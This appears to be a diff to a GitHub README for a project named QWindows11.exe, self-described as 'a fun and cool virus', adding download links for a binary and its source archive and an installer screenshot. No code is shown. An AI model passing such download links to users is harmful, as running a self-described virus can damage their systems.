@@ -1,5 +1,9 @@
 # QWindows11.exe
 This is a fun and cool virus
+
+# [Download x86_64 Binary](https://github.com/Svyatik-Bak/QWindows11.exe/releases/download/1.0/QWindows11.exe)
+# [Download Source code](https://github.com/Svyatik-Bak/QWindows11.exe/archive/refs/tags/1.0.zip)
+
 # Installer
 
 ![Screenshot_2022-09-40-28-12-54-10-981](https://user-images.githubusercontent.com/89962566/192761568-539d4985-dc0b-4abe-84dc-378420273af4.png)
